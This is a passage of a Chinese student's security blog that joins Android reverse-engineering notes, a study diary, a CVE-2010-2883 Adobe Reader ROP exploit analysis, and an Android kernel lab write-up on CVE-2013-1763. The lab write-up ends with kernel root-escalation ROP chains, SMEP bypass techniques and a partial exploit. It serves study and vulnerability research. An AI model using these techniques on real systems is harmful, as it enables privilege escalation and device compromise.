ps：以下内容没有具体例子的分析，原因是其中的大部分知识点，我都是从其他师傅们的文章和代码一路学习过来的。文章也整理了以下放有我自己学习下来感觉收获较大的资源链接。 总结下来，对于一个平台的逆向工程技术需要掌握的技能大致如下： 操作系统的安全架构 操作系统中可执行文件格式 各类工具的使用 反汇编代码的阅读理解 调试器的使用（单独从工具中列出来以示重要性） 网络抓包工具的使用 本文大致分为以下几个模块： android端的基本安全知识 android端的调试逆向 android端的漏洞挖掘 android端的基本安全知识 编译与反编译 虚拟机，汇编，文件结构 Android系统和程序的启动过程 其实总的来说就是—&gt;逆向工程 orz 编译与反编译apktool：可以将apk文件反编译生成smali格式的反汇编代码，也可将apktool重新编译生成apk文件。这里提醒一点就是具体厂商apktool使用会涉及到具体的资源包。 学习途径：https://ibotpeaches.github.io/Apktool/documentation/ adb：android sdk自带的命令行工具，用于与设备通信，便于执行各种设备操作 学习途径：官方文档配上awesome系列基本上就够用了 https://developer.android.google.cn/studio/command-line/adb?hl=zh_cn2 https://github.com/mzlogin/awesome-adb 放几条常用指令： 通过此指令可以获取所有包名 adb shell pm list packages -f 启动app adb shell am start -n [PACKAGE-NAME]/[ACTIVITY-NAME] 列出所有正在执行app的activity adb shell dumpsys activity 停止应用程序 adb shell am force-stop [PACKAGE-NAME]或者adb shell am kill-all [PACKAGE-NAME] signapk，keytool和jarsigner： 用于给apk签名的工具（在这踩过坑，建议搞清楚），这里放一条我常用的解决办法，两条命令，前者是生成自己的密钥，后者是签名，具体选项代表自查 12- keytool -genkey -keystore test.keystore -alias test -keyalg RSA -validity 10000- jarsigner -verbose -keystore test.keystore -signedjar signed.apk unsigned.apk test jd-gui和dex2jar: 反编译工具，通常用于阅读反编译生成的java代码 当然这些都是些传统的工具，推荐在熟悉这些工具的具体运作方式之后再选择高效的集成工具，比如说jadx，jeb等。 apk的打包流程： 用aapt打包资源文件生成R.java文件 处理aidl文件，生成相应java文件 编译工程源代码，生成相应class文件（重要的一步） 转换所有class文件，并生成classes.dex文件（主要是将java字节码转换为Dalvik字节码） 打包生成APK文件 对APK文件签名 对签名后的APK文件进行对齐处理 APK的文件结构： 整体流程如下： app的安装途径：系统程序安装，android市场安装，adb工具安装，sd卡安装app安装过程可以追踪分析android系统程序PackageInstaller中PackageInstallerActivity来去理解，具体内容这里不再展开。 虚拟机，汇编，文件结构Dalvik虚拟机：其设计的初衷也许是是提高运行效率并规避与oracle的版权纠纷其特点有： 体积小，占用内存空间小 dex可执行文件格式 常量池采用32为索引值 基于寄存器架构，有一套完整的指令集（同时有些寄存器没有用到） 提供了对象生命周期管理，堆栈管理，线程管理，安全和异常管理，垃圾回收等功能 android程序都运行在android系统进程里，每个进程对应一个Dalvik虚拟机实例 Dalivik文件结构与java文件结构不同，Dalvik虚拟机通过dx工具对java类文件中常量池进行分解，消除冗余信息后在组合成新常量池 又由于Dalvik虚拟机是基于寄存器架构的，相比于基于栈架构的java虚拟机，数据访问会快很多，同时Dalvik的指令即更加精简，程序的执行速度会快些。android系统架构图： 可见Dalvik属于Android运行时环境，和核心库共同承担Android应用程序的运行工作这里有一点需要注意就是以消息通信的角度来看又可以分成另一个架构图，其中我们常关注的是native层和java层 初次之外还有art，jvm，可以看这篇博客 https://blog.csdn.net/evan_man/article/details/52414390 Android系统和程序的启动过程： Android系统启动加载内核后—-&gt; 执行init进程 —-&gt; 启动Zygote进程 —-&gt; 初始化Dalvik虚拟机 —&gt; 启动system_server进入Zygote模式，用socket等待命令 —&gt; Zygote收到命令后fork一个Dalvik虚拟机实例来执行程序入口函数流程大致如下图： 其中Zygote有三种创建进程的方法: fork()创建Zygote进程 forkAndSpecialize()创建非Zygote进程 forkSystemServer()创建系统服务进程 fork后 —&gt; 虚拟机通过loadClassFromDex完成装载(用gDvm.loadedClass全局哈希表存储查询类) —&gt; dvmVerifyCodeFlow对代码检验 —&gt; FindClass查找装载main方法类 —&gt; dvmInterpret初始化解释器并执行字节码流 以上就是Dalvik在程序执行时的要点，还有其涉及到的JIT技术和Dalvik的汇编代码内容繁杂，建议直接阅读官方文档或者相应书籍其中dex文件主流反汇编工具有BakSmali与Dedexer，详细的dex文件格式内容也建议直接阅读相关资料或源码，这里就出DexFile的数据结构。 12345678910Struct DexFile{ DexHeader Header; DexStringId StringIds[stringIdsSize]; DexTypeId TypeIds[typeIdsSize]; DexProtoId ProtoIds[protoIdsSize]; DexFieldID FieldIds[fileIdsSize]; DexMethodId ClassDefs[classDefsSize]; DexData Data[]; DexLink LinkData;} 图1 模拟器体系结构关于模拟器体系结构的梳理：https://bbs.pediy.com/thread-255672.htm 这个链接放在这里的原因是作者自己曾经根深蒂固地把arm和android两个概念紧紧的结合在一起了，忽略了android studio创建的模拟器是Intel x86架构的，导致踩过坑。 android端的调试这里说是调试而不说逆向的原因是因为逆向的内容实在是太多了，入门可以参考《android软件安全与逆向分析》，《android攻防权威指南》以及《漏洞战争》中的部分内容来学习，这里选择调试中重要的内容来介绍。姑且就分为以下两者吧 手动调试 半自动化工具调试 smali的调试在 smali 语法中，使用的都是寄存器，但是其在解释执行的时候，很多都会映射到栈中。通常每个smali会对应一个类。 编译 - smali2dex 给定一个 smali 文件，我们可以使用如下方式将 smali 文件编译为 dex 文件。 java -jar smali.jar assemble src.smali -o src.dex 运行 smali 在将 smali 文件编译成 dex 文件后，我们可以进一步执行首先，使用 adb 将 dex 文件 push 到手机上 adb push main.dex /sdcard/ 其次使用如下命令执行 adb shell dalvikvm -cp /sdcard/main.dex main AS + smalidea 打开设备中需要调试的apk，在cmd中运行命令 ：adb shell “dumpsys activity top | grep –color=always ACTIVITY”，就可以看到需要调试apk的包名、主acitivity以及进程号（或者也可以使用adb shell “dumpsys activity activities | grep xxxActivity”） 使用命令以debug模式启动apk:adb shell am start -D -n 包名/主activity名，然后你的设备可以看到wait for debugger 再一次运行第一步的命令，获取新的进程号：adb shell “dumpsys activity top | grep –color=always ACTIVITY” 或者运行命令： adb shell “ps | grep 包名”亦可 adb forward tcp:debug端口 jdwp:apk进程号 以上步骤可以直接在as中logcat里选定调试进程，然后选择Attach Debugger To Android Process 查看与包名相关JDWP命令：adb shell “ps -t | grep -A 8 包名” 查看所有JDWP进程命令：adb shell “ps -t | grep -B 6 JDWP” smali的修改 之前尝试用apk改之理，但是由于版本太老了有较多不方便，所以弃坑，现在我通常是apktool反编译后修改，然后再编译并使用自签名，这样也可以达到修改安装使用的效果 基本原生程序 如elf文件就可以 使用 android_server 的 PIE 版本 利用 010Editor 将可执行 ELF 文件的 header 中的 elf header 字段中的 e_type 改为 ET_DYN(3)。 so 原生程序的调试 其加载方式有system.load和system.loadlibrary两种，前者加载绝对路径，后者加载libs下的so文件，两者都会在内部调用doload函数，其流程大致如下 doload -&gt; nativeload -&gt; 对应到Dalvik_java_lang_Runtime_nativeLoad-&gt; dvmLoadNativeCode加载相应的native code -&gt; findSharedLibEntry(判断是否已经加载了这个库以及是否是对应的class loader) –如没有加载–&gt; dlopen打开 –&gt; si-&gt;CallConstructors()初始化 –&gt; 创建表且用dlsym获取对应so文件中 JNI_OnLoad 函数 静态分析 java 层： 没什么好说的，理解程序逻辑去做就好了 静态分析原生层程序基本的过程如下 提取 so 文件 ida 反编译 so 文件阅读 so 代码 根据 java 层的代码来分析 so 代码。 根据 so 代码的逻辑辅助整个程序的分析。 在android studio 3.12后已经将ddms移除了，所以官方的建议是 图2 当我们不能使用ddms时意味着我们使用jdb进行转发时无法确定具体的port，有一种方法是加载程序运行时需要的so文件，然后在一些关键函数比如jniString()函数下断，运行apk后，然后attach其进程即可。 当然有时候会需要在jni_load下断，而so文件又被处理或者干脆jni_load被加密了，这时需要pull出来libdvm so文件,参考我们加载方式的流程，直接查找dvmLoadNativeCode，函数中调用dlopen加载so，返回时so已经加载且已经初始化完成，调试下就能找到。 hook hook的方法很多，但原理就是这么几种，主要有Dalvik,ART,inline,GOT等对象hook，这个有太多大佬写过各种类型的hook了，hook的框架也有许多，展开分析内容太多了，就不再累述了。 Frida hook分为注入进程，直接在源码中修改，以及动态链接三种方式 frida的交互实现大致可以这么理解：默认监听27042端口，对目标进程gadget在启动时进行阻塞，直到实现attach进程或者在使用spawn()后再resume恢复进程，当然这些状态都可以通过配置修改，也可以提前设置好过滤器将特定脚本加载到特定应用中。 由于frida是个轻量级的hook框架，所以还是比较容易添加自己想要的功能，具体请看官网的frida架构图。 frida有一个功能可以为我们生成一个进程而不是将它注入到运行中的进程中，它注入到Zygote中，生成我们的进程并且等待输入。即spawn是注入zygote而attach是注入当前进程。 这里有遇到过的一些小坑，分别是设备检测问题和windows端的编码问题： https://github.com/frida/frida/issues/1111 https://github.com/rkern/line_profiler/issues/37 android漏洞挖掘一直想挖android上的漏洞，但真正上手的时候发现自己缺乏很多真实场景的经验和思路，毕竟漏洞挖掘和ctf题差距还是不一般的大（汗），于是就整理了下android上常见的问题，尽可能的去整理些思路出来。 ps：这里有一个点没有涉及，就是关于android端会涉及到较多的抓包分析工作，但无奈我是个二进制菜鸡，就不班门弄斧的推荐了。 我们都知道android四大组件，所以这里的大部分内容来自对瘦蛟舞大佬多年前文章的阅读笔记（汗，果然小白只能玩大佬玩剩下的） Activity常见的关注点 activity的生命周期 launch mode taskAffinity task and activity android:exported android:permission 关键方法 12345678910111213141516onCreate(Bundle savedInstanceState)setResult(int resultCode, Intent data)startActivity(Intent intent)startActivityForResult(Intent intent, int requestCode)onActivityResult(int requestCode, int resultCode, Intent data)setResult (int resultCode, Intent data)getStringExtra (String name)addFlags(int flags)setFlags(int flags)setPackage(String packageName)getAction()setAction(String action)getData()setData(Uri data)getExtras()putExtra(String name, String value) activity分为四种，在考虑安全时分别从创建activity和使用activity时考虑 广播接收器既可以在manifest文件中声明，也可以在代码中进行动态的创建，并以调用Context.registerReceiver()的方式注册至系统。 注意关注类型 protectionlevel 权限 Broadcast广播需要注意广播的对象范围以及持久性带来的影响 关键方法 123456789sendBroadcast(intent)sendOrderedBroadcast(intent, null, mResultReceiver, null, 0, null, null)onReceive(Context context, Intent intent)getResultData()abortBroadcast()registerReceiver()unregisterReceiver()LocalBroadcastManager.getInstance(this).sendBroadcast(intent)sendStickyBroadcast(intent) ContentProvider用来存放和获取数据并使这些数据可以被所有的应用程序访问。它们是应用程序之间共享数据的唯一方法；不包括所有Android软件包都能访问的公共储存区域。 Content Provider关键方法 1234567891011public void addURI (String authority, String path, int code)public static String decode (String s)public ContentResolver getContentResolver()public static Uri parse(String uriString)public ParcelFileDescriptor openFile (Uri uri, String mode)public final Cursor query(Uri uri, String[] projection,String selection, String[] selectionArgs, String sortOrder)public final int update(Uri uri, ContentValues values, String where,String[] selectionArgs)public final int delete(Uri url, String where, String[] selectionArgs)public final Uri insert(Uri url, ContentValues values)public abstract void grantUriPermission (String toPackage, Uri uri, int modeFlags) //Grant permission to access a specific Uri to another package, regardless of whether that package has general permission to access the Uri's content provider. 临时授权public abstract void revokeUriPermission (Uri uri, int modeFlags) //Remove all permissions to access a particular content provider Uri that were previously added with grantUriPermission(String, Uri, int). 移动授权 ServicestartService与bindService两者的区别就是使Service的周期改变.由startService启动的Service必须要有stopService来结束Service,不调用stopService则会造成Activity结束了而Service还运行着.bindService启动的Service可以由unbindService来结束,也可以在Activity结束之后(onDestroy)自动结束. 关键方法 12345678onStartCommand() OnBind() OnCreate()OnDestroy() public abstract boolean bindService (Intent service, ServiceConnection conn, int flags)startService()protected abstract void onHandleIntent (Intent intent)public boolean onUnbind (Intent intent)","link":"/2020/02/24/2020-2-24-androidlearning/"},{"title":"日志","text":"daily record之前看到某大佬有每天记日志的一个习惯，发现长时间下来，可以比较清晰地梳理自己的学习进程，及时地做出一些调整和总结，同时也能够起到一个督促自己的作用，希望自己也能坚持下来 2020-3-4ndk开发，mk文件编写看了腾讯游戏安全书中除ios部分的内容，感觉学到蛮多hook的知识，但是还没来得及细致地看源码 2020-3-5 看了手游安全书中的源码，分析了重点 复习了一波frida的用法，刷了攻防世界的几道题，并尝试用frida脚本解题，结果发现有很多hook不出的情况，没达到预期的效果 2020-3-6 一早起来解决了昨天frida的问题，发现究其原因还是对工具的不熟悉，于是狠狠恶补了一波脚本编写 搜了一波frida的脚本和工具，但由于还是太分散，过几天写个工具集合（objection还是很不错的） 学校的机器学习让我头疼，直接搜包源码然后自己魔改实现，具体原理还没细致地去扣（记一笔） 晚上复习了下fuzz的东西，主要是直接代码审计还是感觉缺少些类似场景构建的思维方式，打算接下去这么做： 继续复现漏洞，总结并分类（hin重要啊） 看各类fuzz和sanitizers，然后写自己的fuzz，一遍挖一遍改进，也希望从这些中总结些经验 2020-3-7今天阅读了些fuzz的技巧和思路，主要是afl和android的一些fuzz，把链接就一起放在资源收集里了。感觉动手还是不够，进度太慢了些，之前的学习方式不太对，还是应该更注重实践一些，以实践驱动学习理论基础好像更能推动我去学。 2020-3-8 看了sanitizer的用法，读了一部分源码 刷了一堆论文，寒假和老师商量了，希望在大学四年里能发一篇有质量的a类论文，哪怕将来读不了研，也希望不要留下遗憾吧 搜罗整理了一堆资料 2020-3-9-3-10 这两天主要是配置了android的内核调试环境，复现了cve-2013-1763的一个内核漏洞以及其他的一些样例漏洞，感觉漏洞原理以及exp的构造在阅读完后也不复杂，但觉得在复现过程比较困惑的一点还是漏洞的最初的bug触发到漏洞发现的这段步骤，也就是说，我是怎样通过使用工具去察觉到这个地方是有问题的，这一点我觉得是比较重要的 又混了篇看雪优秀23333 缺补漏地实验了一把mitm攻击，然后研究了下绕过hsts的攻击方式 晚上刷了波论文，大致确定了方向，再不定方向老师估计要抛弃我了orz，看了下最近的比赛题 2020-3-10-3-25主要是在搞实习的事情，准备的比较仓促，暂时还没拿到自己期待实验室的offer，期间科恩面了两次，怎么说呢，面试官的问题让我确实意识到平日里的学习姿势的一些不足之处，但遗憾的是没能进到科恩去实习，菜是根本，唉，不过收拾了下心情也就没啥了，希望自己将来还是能让人刮目相看的吧，hhhhhh引用学长对我说的一句话，自处不留爷自有留爷处，期待能达到让他人来邀请我的一天。面试期间也巩固了许多自己的不足点，当然也还发现很多地方仍然需要加强。觉得自己的编程能力还要加强，做安全的也还是要多开发同时大量实践，尤其是像我这种入门晚的，更加需要实践最后的话需要关注热点和动态，及时更新自己的知识和工具库 2020-3-26-3-27这两天调了下android kernel的一些漏洞，学到了蛮多新姿势，接下来基本上就是复现fuzz和手动挖洞打ctf联exp编写和思路开发工具等唉 加油吧 2020-4-2搞了一下午加晚上的计网作业，唉还把路由器重置了，烦面了字节，说实话面试的时候没啥感觉，胡乱答了 2020-4-3逆了下微信，实现了frida hook 发微信动态的功能，但还没深入，感觉可能存在越权行为调试了一个futex漏洞，是由reblock和requeue两个漏洞结合起来的利用，exp还没理解透看了两篇关于bluedroid的漏洞分析 2020-4-4和同学出去浪了，下午一个前辈问要不要到他的部门去做研发，唉，怎么说呢，二进制安全从开始学习到现在也快要一年了，感觉自己没啥成绩，一路上遇到的要么是很强的师傅，要么转了开发，真不知道像我这样还能不能去好的实验室，有点沮丧晚上回来调了futex漏洞exp，加深了一些理解，学到了一些新的姿势 2020-4-5-4-6这两天光忙着实现计网作业了（基本上是实现p2p的一个项目） 2020-4-7看了几篇arm下的漏洞挖掘和利用技巧的文章看了一个蓝牙的漏洞（和协议的使用相关） 2020-4-25之前的日志不打算补了，期间事情不断，不知道是不是因为疫情的关系，各个公司的实习进度条贼慢，今天打算先去学长的公司实习学习了，另外也不多说啥了，加油吧，感觉似乎又有斗志回来了。 2020-4-26-5-11 hhhhhh 又鸽了半个多月，期间经历了五一，de1ctf，网鼎。wp等我全部整理完再贴吧（学校三个核心队员，两web，一人二进制，真*打不动，下次要多带飞下学弟） 混进nepnep，发现师傅们都学的很精，不像我，泛泛又泛泛，题目也是越来越搞事情 收到了360冰刃的offer，但逐渐发现星阑的安研也很强（人少就直接被大佬带飞） 终于开始搞浏览器了，感觉现在还是挖软件香？","link":"/2100/01/01/2100-1-1-dailyrecord/"},{"title":"CVE-2010-2883栈溢出漏洞","text":"CVE-2010-2883是Adobe Reader和Acrobat中的CoolType.dll库在解析字体文件SING表中的uniqueName项时存在的栈溢出漏洞，用户受骗打开了特制的PDF就有可能导致执行任意恶意代码 操作系统： windows xp 虚拟机：VMware 调试器：IDA，OD 漏洞软件：Adobe Reader9.3.4 我调试的环境可能有所偏差，所以一开始定位无法直接跳到0x0803DD74下断点，也无法在cmd插件中用bp 0x0803DD74实现，这里给也遇到的这个问题的同学也给两个解决方法，一是先下断点在strcat，然后函数返回后再在0x0803DD74下断点，重新加载，二是直接用bpx 0x0803DD74，两者的区别是 bp 断是直接把入口改成CC，bpx 是哪里调用的函数，就哪里CC，即前者在这一函数的入口处下断点，后者在所有如call xxxx的代码处下断点。 从此往下分析 在这里调用的函数0x8021B06，实际上处理ecx中的内容，这一点可以直接从ida中看，也可以在这里跟进去，那ecx的是什么呢？由于前面传递参数时使用了两个显式参数（ecx在这里是隐式参数，显式参数直接放在栈里了）中提示SING字符串，那我们就怀疑是在处理sing表了。 查看官方文档可知在pdf中支持的一种Font类型是TrueType（简称ttf），在此字体文件中，从0字节偏移的位置开始有一个表目录，其第一个字段sfnt version是用来表明所用ttf格式版本的，对于1.0版本的TTF字体文件开头要用0x00010000来表示版本。于是我们在数据面板跟随一下ecx中的地址内的内存地址中存储着的值。 发现果然是0x10000的版本号，所以ecx保存的是SING表的入口指针。继续往下来到0x0803dd85的位置，这里明显是在判断0x0a49da6c这个数据段是否为空。那这些数据又是什么呢？ 有了前面的SING，推测是和SING相关的数据。了解到ttf格式中的存有TableEntry的数据结构的，而SING正是其中一项。 1234567typedef struct_SING{ char tag[4] //标记-&gt;SING ULONG checkSum //校验和-&gt;0xD9BCCBB5 ULONG offset //相对文件的偏移-&gt;011C ULONG length //数据长度-&gt;0x1DDF} 据此，推测那应该是在处理SING的具体内容，为了验证，我们需要找到SING项，得到offset，然后找到文件内容后与OD中0xa49da64的数据做对比。这里我们使用PdfStreamDumper提取寻找后发现确实是在判断SING的内容是否为空，接下来经过提取版本号后我们跳转到0x0803ddc0。 之前在IDA中可能不确定具体strcat用的是哪些数据，在这里可以进一步明确，采用的是从uniqueName开始往后的内容。（具体参照SING数据结构） 那接下去很明显的就是strcat（&amp;ebp，uniqueName~xxxx）的操作，那就是说我们uniqueName开始往后的数据将覆盖从0x12e4d8往后的数据，从而可以控制返回地址。 可以看到程序会回到icucnv36.dll内的一个地址。定位该文件并用010editor查看后该文件后发现 IMAGE_NT_HEADERS NtHeaderIMAGE_OPTIONAL_HEADER中的IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE 的值为0，也就是说这个模块没有开启ASLR。 继续执行下去看到0x0808b308处调用icucnv36.dll的内容，跟进去看。 发现是gadget，返回后又是个gadget 第二个gadget我们返回的地址是0x0c0c0c0c，执行后栈内明显出现了不寻常的数据，一看就是早就在文档里构造好的各种gadget地址。 继续执行下去就是漏洞利用的内容了，主要是用ROP执行CreatFileA，CreateFileMapping，MapViewofFile和memcpy（其实看到这就明白是通过复制shellcode到rwx段的操作）通过其中CreatFileA创建了iso88591的文件，再用CreateFileMapping创建文件内存映射，而MapViewofFile是将文件内存映射到程序内存的函数，并返回地址给memcpy好将shellcode复制到无DEP保护的区域。 cve-2010-3333 Microsoft RTF栈溢出漏洞 问题是在OpenXML文件格式转换器处理RTF中的“pFragments”属性的时候存在栈溢出。","link":"/2020/02/24/2020-2-24-CVE-2010-2883/"},{"title":"搭建android内核环境（顺带分析cve-2013-1763)","text":"本来是想尝试在android下复现，但最后还是只在linux下复现成功了，可能还是出现了些纰漏的地方 以前搭建过linux的内核环境，当时是为了做kernel pwn搭建的，但是尝试复现android kernel的漏洞，虽说原理相同，但还是重新搭建了新的环境。 搭建环境的步骤基本没遇到什么大坑，跟着这个库走基本就没遇到什么大坑 配置 12345playground├── android-sdk-linux├── arm-linux-androideabi-4.6├── goldfish└── kernel_exploit_challenges 123456git clone https://aosp.tuna.tsinghua.edu.cn/platform/prebuilts/gcc/linux-x86/arm/arm-linux-androideabi-4.6git clone https://aosp.tuna.tsinghua.edu.cn/kernel/goldfish &amp;&amp; \\git clone https://github.com/Fuzion24/AndroidKernelExploitationPlayground.git kernel_exploit_challenges &amp;&amp; \\cd goldfish &amp;&amp; git checkout -t origin/android-goldfish-3.4 &amp;&amp; \\git am --signoff &lt; ../kernel_exploit_challenges/kernel_build/debug_symbols_and_challenges.patch &amp;&amp; \\cd .. &amp;&amp; ln -s $(pwd)/kernel_exploit_challenges/ goldfish/drivers/vulnerabilities 搭建内核123export ARCH=arm SUBARCH=arm CROSS_COMPILE=arm-linux-androideabi- &amp;&amp;\\export PATH=$(pwd)/arm-linux-androideabi-4.6/bin/:$PATH &amp;&amp; \\cd goldfish &amp;&amp; make goldfish_armv7_defconfig &amp;&amp; make -j8 编译完成后，就会有两个主要的文件：goldfish/vmlinux 和 goldfish/arch/arm/boot/zImage。前面那个用于在调试时 gdb加载，后面的用于在安卓模拟器启动时加载。vmlinux 用于提供符号表，zImage 则用于运行环境 然后下载或者编译sdk，下载完成后解压并将 android-sdk-linux/tools 加入环境变量（.bashrc） 123wget http://dl.google.com/android/android-sdk_r24.4.1-linux.tgztar xvf android-sdk_r24.4.1-linux.tgzexport PATH=YOURPATH/android-sdk-linux/tools:$PATH 还要下jdk在终端中输入 android，下载我们需要的 SDK 和系统镜像 运行模拟器创建模拟器 1android create avd --force -t &quot;android-19&quot; -n kernel_challenges 其选项按需求选择，反正我一开始是一路enter的。。。 接下来进入 goldfish 目录，执行下面的命令用我们的内核运行模拟器，并在 1234 端口 起一个 gdbserver 方便内核调试。 1emulator -show-kernel -kernel arch/arm/boot/zImage -avd kernel_challenges -no-boot-anim -no-skin -no-audio -no-window -qemu -monitor unix:/tmp/qemuSocket,server,nowait -s 再开一个 shell，进入 goldfish 目录，加载 vmlinux 以便调试内核： 1arm-linux-androideabi-gdb vmlinux 这里的gdb注意因为前面export path了，所以实际路径是在arm-linux-androideabi-4.6/bin里 出现arm-linux-androideabi-gdb: error while loading shared libraries: libpython2.6.so.1.0: cannot open shared object file: No such file or directory问题时用以下方法即可： 1ln -s /usr/lib/x86_64-linux-gnu/libpython2.7.so /lib/x86_64-linux-gnu/libpython2.6.so.1.0 这样基本上就可以调试内核了。。 整体来说不太复杂，就是拖文件够呛，网络太差了orz之前调试kernel pwn题的时候还要烦些，后来用了两种方式搞定kernel环境，一是在虚拟机里搞定后再在本机的vscode 用ssh连接虚拟机，就实现了在vscode边写代码边测试的路子（很舒服），后来还是觉得麻烦因为要关hyper，不能使用wsl处理一般事务，于是就直接在我的pwn docker里直接搭建环境也成功了，然后再用docker共享文件也实现了边写代码边测试的路子（更舒服而且cpu的负荷啥的也小），具体搭建kernel环境的步骤不再累述，网上很多。 二更：分析了cve-2013-1763, 还是踩了一些坑放一下一些内核的安全利用点(很不全），可以直接看ctf wiki或者其他的类似博客，大佬略过即可 KASLR内核地址空间随机化。内核地址显示限制即kptr_ restrict指示是否限制通过/ proc和其他接口暴露内核地址。0：默认情况下，没有任何限制。1：使用％pK格式说明符打印的内核指针将被替换为0，除非用户具有CAP_ SYSLOG特权2：使用％pK打印的内核指针将被替换为0而不管特权。 也就是说，当kptr_ restrict被限制的时候我们不能直接通过cat /proc/kallsyms来获得commit_creds的地址，要禁用该限制使用下面的命令：sudo sysctl -w kernel.kptr_restrict=0 内核的rop 1234567891011121314|----------------------|| pop rdi; ret |&lt;== low mem|----------------------|| NULL ||----------------------|| addr of || prepare_kernel_cred()||----------------------|| mov rdi, rax; ret ||----------------------|| addr of || commit_creds() |&lt;== high mem|----------------------| smepsmep位于CR4寄存器的第20位，设置为1。CR4寄存器的值：0x1407f0 = 0001 0100 0000 0111 1111 0000关闭SMEP方法修改/etc/default/grub文件中的GRUB_CMDLINE_LINUX=””，加上nosmep/nosmap/nokaslr，然后update-grub就好 绕过smep的方法由于我们只能在内核空间执行代码，但是不能把ROP链放到内核空间中，所以只能用stack pivot把ROP链放到用户空间。然后在内核空间找到合适的gadget放到ROP链中stack pivot 1234mov rXx, rsp ; retadd rsp, ...; retxchg rXx, rsp ; ret(xchg eXx, esp ; ret)xchg rsp, rXx ; ret(xchg esp, eXx ; ret) 还有一种比较简单的绕过SMEP的方法是使用ROP翻转CR4的第20位并禁用SMEP，然后再执行commit_creds(prepare_kernel_cred(0))获取root权限。如下构造 1234567891011offset of rippop rdi; retmov CR4, rdi; retcommit_creds(prepare_kernel_cred(0))swapgsiretqRIPCSEFLAGSRSPSS 漏洞的问题点其实不难，做过一点pwn的师傅们都能看的出来是个OOB类型的漏洞，简要分析下先看patch，发现增加了个对req-&gt;sdiag_family的大小检查，于是定位到这个函数。 发现外面还有个封装，不难看出要触发这个函数需要nlh的nlmsg_type类型为SOCK_DIAG_BY_FAMILY 12345678910111213141516171819202122232425static int sock_diag_rcv_msg(struct sk_buff *skb, struct nlmsghdr *nlh){ int ret; switch (nlh-&gt;nlmsg_type) { case TCPDIAG_GETSOCK: case DCCPDIAG_GETSOCK: if (inet_rcv_compat == NULL) request_module(&quot;net-pf-%d-proto-%d-type-%d&quot;, PF_NETLINK, NETLINK_SOCK_DIAG, AF_INET); mutex_lock(&amp;sock_diag_table_mutex); if (inet_rcv_compat != NULL) ret = inet_rcv_compat(skb, nlh); else ret = -EOPNOTSUPP; mutex_unlock(&amp;sock_diag_table_mutex); return ret; case SOCK_DIAG_BY_FAMILY: return __sock_diag_rcv_msg(skb, nlh); default: return -EINVAL; }} 可以在linux手册上看到nlmsghdr结构 123456789101112struct nlmsghdr { __u32 nlmsg_len; /* Length of message including header */ __u16 nlmsg_type; /* Type of message content */ __u16 nlmsg_flags; /* Additional flags */ __u32 nlmsg_seq; /* Sequence number */ __u32 nlmsg_pid; /* Sender port ID */};nlmsg_type can be one of the standard message types: NLMSG_NOOP mes‐sage is to be ignored, NLMSG_ERROR message signals an error and thepayload contains an nlmsgerr structure, NLMSG_DONE message terminatesa multipart message. 要想调用到该结构体，需要使用NETLINK_SOCK_DIAG协议的Netlink套接字发送消息，具体可参考netlink编程或Netlink Socket，这里就不再累述。 再看__sock_diag_rcv_msg函数，可以知道，如果没有patch，那么在sock_diag_lock_handler的参数我们可以调用超过AF_MAX大小的值 123456789101112131415161718192021static int __sock_diag_rcv_msg(struct sk_buff *skb, struct nlmsghdr *nlh){ int err; struct sock_diag_req *req = nlmsg_data(nlh); const struct sock_diag_handler *hndl; if (nlmsg_len(nlh) &lt; sizeof(*req)) return -EINVAL; if (req-&gt;sdiag_family &gt;= AF_MAX) return -EINVAL; hndl = sock_diag_lock_handler(req-&gt;sdiag_family); if (hndl == NULL) err = -ENOENT; else err = hndl-&gt;dump(skb, nlh); sock_diag_unlock_handler(hndl); return err;} 再看sock_diag_lock_handler以及sock_diag_handlers函数组的定义，发现在这里就出现了OOB的问题 1234567891011static const inline struct sock_diag_handler *sock_diag_lock_handler(int family){ if (sock_diag_handlers[family] == NULL) request_module(&quot;net-pf-%d-proto-%d-type-%d&quot;, PF_NETLINK, NETLINK_SOCK_DIAG, family); mutex_lock(&amp;sock_diag_table_mutex); return sock_diag_handlers[family];}static const struct sock_diag_handler *sock_diag_handlers[AF_MAX]; 根据上面的一些介绍和链接参考基本上就能知道要如何去构造而exp了, 我看网络上公布的exp大致原理相同，可参考1,2,3，而AndroidKernelExploitationPlayground是自己实现了个类似的漏洞，大致原理原理类似，但无需构造socket去与他交互和填充具体的结构体数值，更加好理解些。exp的分析一起写在代码里了 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121#include &lt;stdio.h&gt;#include &lt;strings.h&gt;#include &lt;fcntl.h&gt;#include &lt;sys/mman.h&gt;#include &quot;../../module/CommandHandler.h&quot;#include &quot;dbg.h&quot;__u32get_symbol(char *name){ FILE *f; __u32 addr; char dummy, sname[512]; int ret = 0; //在/proc/kallsyms文件中存放着结构体的地址，需要读取用来先对偏移 //如果系统开启了内核地址显示限制可以用这个命令禁用 //sudo sysctl -w kernel.kptr_restrict=0 f = fopen(&quot;/proc/kallsyms&quot;, &quot;r&quot;); if (!f) { return 0; } while (ret != EOF) { ret = fscanf(f, &quot;%p %c %s\\n&quot;, (void **) &amp;addr, &amp;dummy, sname); if (ret == 0) { fscanf(f, &quot;%s\\n&quot;, sname); continue; } if (!strcmp(name, sname)) { printf(&quot;[+] resolved symbol %s to %p\\n&quot;, name, (void *) addr); return addr; } } return 0;}__u32 commit_creds;__u32 prepare_kernel_cred;int main(void){ //基本思路一样的，都是最终调用commit_creds(prepare_kernel_cred(0)); commit_creds = get_symbol(&quot;commit_creds&quot;); prepare_kernel_cred = get_symbol(&quot;prepare_kernel_cred&quot;); //这个是封装在AndroidKernelExploitationPlayground环境内的漏洞文件位置（这里和其他的exp不同，重点没有去构造socket与其交互，而是直接用其自己实现的伪“函数”，然后用ioctl与其交互。 int cmd_handler = open(&quot;/dev/array_index&quot;, O_RDWR); check(cmd_handler &gt;= 0, &quot;Error opening challenge device&quot;); //这里就是构造一块可入可写可执行的用户空间，在这段空间内布置rop链 __u32 mmap_start = 0x02000000, mmap_size = 0x15000; printf(&quot;[+] Mapping userspace memory at 0x%x\\n&quot;, mmap_start); void * mapped = mmap((void*)mmap_start, mmap_size, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0); check(mapped != MAP_FAILED, &quot;Failed mapping&quot;); //0x00000000 is nop for ARM bzero( (void*)mmap_start, mmap_size ); //这里是arm上的exp，学过arm pwn的师傅们应该也不觉得陌生 